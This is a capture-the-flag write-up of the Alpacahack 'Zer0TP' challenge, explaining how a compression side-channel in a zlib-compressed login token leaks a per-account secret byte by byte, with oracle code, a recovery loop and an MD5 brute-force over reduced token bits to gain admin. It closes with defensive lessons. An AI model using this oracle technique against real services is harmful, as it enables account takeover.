---
title: "Alpacahack — Zer0TP: Breaking Auth with a Compression Side-Channel"
date: 2026-09-11
tags: [web, side-channel, compression, auth, alpacahack]
ctf: "Alpacahack"
summary: "Breaking a three-party authentication scheme via CRIME-style compression side-channel — one bit of oracle per request reveals the full token character by character."
draft: false
---

## 1. The Setup

The challenge is an authentication scheme built around three parties:

1. **Zer0TP**  an auth provider. You register an account here, log in, and it hands you tokens.
2. **The third-party app**  the site that actually holds the flag. It doesn't manage accounts itself; it trusts Zer0TP to say who you are and whether you're an admin.
3. me :) a normal registered user, trying to become an admin without ever being given admin rights.

The flag only renders when the third-party app believes your account is an admin. Since the app has no admin logic of its own, the entire challenge reduces to one question:

> **How do I make Zer0TP say `is_admin: 1` for my account?**

---

## 2. Mapping the Trust Chain

### 2.1 The client app trusts Zer0TP blindly

```python
@app.route("/")
def home():
    if 'username' not in flask.session:
        return flask.redirect("/login")

    r = requests.get(f"http://{ZER0TP_HOST}:{ZER0TP_PORT}/api/is_admin",
                      params={"username": flask.session['username']})
    is_admin = json.loads(r.text)["is_admin"]

    return flask.render_template("index.html",
        flag=FLAG, is_admin=is_admin, username=flask.session['username'])
```

The client has zero admin logic of its own  it asks Zer0TP and renders whatever comes back. This confirms the target: **Zer0TP's `/api/is_admin` response**, not the client.

### 2.2 Zer0TP just reads a Redis field

```python
@app.route("/api/is_admin", methods=["GET"])
def is_admin():
    username = flask.request.args.get("username", "").encode()
    admin = r.hget(username, 'admin')
    return flask.jsonify({"result": "OK", "is_admin": int(admin)})

@app.route("/api/register", methods=["POST"])
def register():
    r.hmset(username, {"pass": hashlib.sha256(password).hexdigest(), "admin": 0})
    return flask.jsonify({"result": "OK"})
```

`admin` is hardcoded to `0` at registration. No exposed path sets it to `1`  yet.

### 2.3 The endpoint that actually grants admin

```python
@app.route("/api/set_admin", methods=["POST"])
def set_admin():
    username = flask.request.form.get("username", "").encode()
    req_secret = flask.request.form.get("secret", "").encode()
    admin = flask.request.form.get("admin", "0")

    secret = r.get(username)          # from a SEPARATE redis db (db=1)
    if secret != req_secret:
        return flask.jsonify({"result": "error", "reason": "Access denied"})

    r.hset(username, "admin", 1 if admin == '1' else 0)
    return flask.jsonify({"result": "OK"})
```

Everything collapses to one missing value: **`secret`**, a 12-byte random string generated per-account and cached in Redis for 30 minutes. Get this, and `/api/set_admin` hands you admin on a plate.

### 2.4 Where the secret leaks a little bit of itself

```python
@app.route("/api/login", methods=["POST"])
def login():
    id = os.urandom(8).hex()
    secret = r.get(username)
    if secret is None:
        secret = base64.b64encode(os.urandom(12))
        r.set(username, secret)

    token = zlib.compress(username + secret)[:8]
    return flask.jsonify({
        "result": "OK", "id": id,
        "token": hashlib.md5(id.encode() + token).hexdigest()
    })
```

Two design decisions make this exploitable:

- `username` (attacker-controlled) is compressed **in the same stream** as `secret` (unknown). Compressors look for repeated substrings  if attacker-controlled bytes happen to match the secret, that shows up in the output.
- The developers *tried* to block direct inspection of the compressed output by hashing it with MD5 first (`md5(id + token)`), instead of returning `token` raw.

This gives the attack two stages: recover the raw `token` from its MD5 hash, then use `token`'s structure as an oracle to leak the secret.

---

## 3. Stage One: Compression as an Oracle

### 3.1 The one fact that matters

DEFLATE (the algorithm behind zlib) finds repeated chunks of **3 or more bytes** and replaces the second occurrence with a short backreference (`<length, distance>`) instead of writing it out again. A match under 3 bytes is never recorded — this threshold is the whole basis of the attack.

### 3.2 Where that shows up in the output bytes

DEFLATE blocks start with a small header. One field in that header, `BTYPE`, records how the block's symbols were encoded — and whether it's worth encoding depends on whether any backreferences exist. Practically:

- **No repeated 3+ byte chunk found** → header stays in one state.
- **A repeated chunk found (a match against the secret)** → header flips.

Because zlib wraps DEFLATE with a fixed 2-byte header (`CMF`, `FLG`), this flag sits at **byte index 2** of the compressed output. Checking one bit there gives a clean yes/no signal:

```python
def oracle(guess, prefix):
    username = de_bruijn + prefix + guess + b"$#"
    token = zlib.compress(username + secret)[:8]
    return token[2] >> 3     # 0 = no match, 1 = match found
```

### 3.3 Verified example (I ran this locally)

Fake secret: `secret = b"pcVeloMX8EfvwaoO"`.

```
guess = "A"  →  token bytes: 78 9c 05 c2 21 0e 80 30  →  byte[2]=0x05 → bit = 0  (no match)
guess = "p"  →  token bytes: 78 9c 0d c2 31 0a 80 30  →  byte[2]=0x0d → bit = 1  (match!)
```

`p` is genuinely the first character of the fake secret — the bit flip is the compressor detecting a duplicate.

### 3.4 Why compression alone isn't enough: noise control

If the padding around your guess repeats itself internally (`"AAAAAAAA"`), the compressor can find a false match against *itself*, not the secret. The fix: a **De Bruijn sequence** — a string over a small alphabet, constructed so that **no 3-character substring repeats anywhere inside it**:

```python
de_bruijn = b':::;::<::=:;;:;<:;=:<;:<<:<=:=;:=<:==;;;<;;=;<<;<=;=<;==<<<=<==='[:44]
```

Its alphabet (`:;<=`) is also chosen to never overlap with the secret's own alphabet (base64: `A–Z a–z 0–9 + /`), eliminating any chance of accidental collision from either direction.

---

## 4. Stage Two: Recovering the Secret Byte-by-Byte

### 4.1 Why 1-at-a-time instead of exhaustive 3-byte guessing

Brute-forcing all 3 unknown bytes together costs up to `64³ ≈ 262,000` tries **per position**, with no way to know where in the secret a hit landed. Instead, once 2 bytes are confirmed correct, only the 3rd is ever unknown — dropping the cost to `64` tries per position, `16` positions total.

```python
def username_for(prefix, guess):
    return de_bruijn + prefix + guess + b"$#"
```

- `prefix` — the last 2 **confirmed correct** bytes of the secret so far.
- `guess` — the one new byte currently being tested.
- `prefix + guess` = a fresh 3-byte test each round.

### 4.2 The bootstrap problem (byte 0)

At the very start, there are no confirmed bytes yet, so `prefix` can't hold real secret content. The fix: initialize `prefix = b"$#"` — deliberately identical to the fixed separator that always sits right before `secret` in the compressed buffer:

```
buffer = de_bruijn + "$#" + guess + "$#" + secret
```

Since the leading `"$#"` and the separator `"$#"` are always identical regardless of `guess`, the *only* variable deciding a match is whether `guess == secret[0]`. Verified locally: `guess="A"` → bit 0; `guess="p"` (real first byte) → bit 1.

From byte 1 onward, `prefix` holds real recovered secret bytes, and the match becomes direct: `prefix + guess` literally reproduces `secret[i : i+3]` when the guess is correct, and DEFLATE finds that reproduction against the real secret appended later in the buffer.

### 4.3 The full recovery loop

```python
prefix = b"$#"
guess = b''
for _ in range(16):
    for c in alphabet:
        if oracle(bytes([c]), prefix) != 0:
            guess += bytes([c])
            prefix = (prefix + bytes([c]))[-2:]   # slide the 2-byte window
            break
```

Verified locally, recovering the first 6 bytes of `pcVeloMX8EfvwaoO`:

```
position 0: prefix=$#  → found 'p' → guess=p
position 1: prefix=#p  → found 'c' → guess=pc
position 2: prefix=pc  → found 'V' → guess=pcV
position 3: prefix=cV  → found 'e' → guess=pcVe
position 4: prefix=Ve  → found 'l' → guess=pcVel
position 5: prefix=el  → found 'o' → guess=pcVelo
```

---

## 5. Stage Three: Cracking the MD5 Wrapper

The server never gives `token` directly — only `md5(id + token)`. Brute-forcing 8 fully unknown bytes is `2^64` — infeasible.

### 5.1 Key insight: compressed output isn't uniformly random

Compressed data has fixed structural bytes (headers, checksum positions) mixed with a small number of bytes that actually vary based on input. The approach: **sample the oracle a large number of times with random inputs, and record which of the 64 bits ever change.**

```python
all_ones = tokens[0]
all_zeros = ~tokens[0] & 0xFFFFFFFFFFFFFFFF
fluctuating_bits_mask = 0

for t in tokens[1:]:
    all_ones &= t
    all_zeros &= ~t & 0xFFFFFFFFFFFFFFFF
    fluctuating_bits_mask |= (t ^ prev)
```

Result for this challenge: only **~22 of the 64 bits** ever changed. That means only `2^22 ≈ 4,000,000` distinct `token` values are actually possible — small enough to brute-force in seconds, not the billions of years `2^64` would take.

### 5.2 Using the reduced space to crack each token

```python
BASE_1_BITS      = 0b111100010011100000001011100000000000001000000000000000000000000
FLUCTUATING_MASK = 0b10000000111111111110000111111100000001110000

fluctuating_positions = [i for i in range(64) if (FLUCTUATING_MASK >> i) & 1]
shifts = [1 << pos for pos in fluctuating_positions]
total_iterations = 1 << len(fluctuating_positions)
```

For each candidate index `0` to `total_iterations - 1`, use the index's own bits as instructions for which fluctuating positions to flip on, starting from the known-stable baseline (`BASE_1_BITS`):

```python
for counter in range(total_iterations):
    candidate_int = BASE_1_BITS
    for i, shift in enumerate(shifts):
        if (counter >> i) & 1:
            candidate_int |= shift
    candidate_bytes = candidate_int.to_bytes(8, 'big')
    if hashlib.md5(challenge_id + candidate_bytes).hexdigest() == target_md5:
        recovered_token = candidate_bytes
        break
```

This has to run **once per oracle call** (every single character guess), since `token` changes with every new username. ~4 million MD5 hashes per guess is still fast enough for the full attack to finish in minutes.

---

## 6. Key Takeaways

- **Trust delegation needs matching validation on both ends.** The client app trusted Zer0TP's word entirely; Zer0TP trusted whatever was in Redis. Neither validated *how* that state got there  the actual gap was in the mechanism that set `admin`, several layers removed from where the flag was rendered.

- **Compressing attacker-controlled data next to a secret, in the same stream, is a side-channel by default.** This is the same family of bug as CRIME/BREACH against TLS  any time user input and a secret share a compression context, matching substrings become observable through output shape, even through a single header bit.

- **Hashing a leaky value doesn't stop the leak  it just adds a step.** Wrapping `token` in `md5(id + token)` blocks direct byte inspection, but if the underlying value has a small effective search space (most bits are structurally fixed), the hash is a speed bump, not a wall.

- **Turn "impossible" search spaces into small ones by measuring, not assuming.** Rather than manually deriving the DEFLATE header bit layout, empirically sampling a million outputs and diffing them directly revealed exactly which bits mattered cutting `2^64` down to `2^22` without fully modeling the format by hand.

- **Character-by-character oracle attacks scale linearly, not exponentially.** By anchoring each guess to previously-confirmed bytes (a sliding 2-byte prefix), the search cost per unknown byte stays constant (`~64` tries) instead of growing with the total secret length.

- **Bootstrap edge cases are often solved by reusing an existing fixed value as a placeholder**, rather than adding special-case logic here, initializing `prefix` to equal the literal separator string let the very first byte be tested with the exact same code path as every subsequent byte.
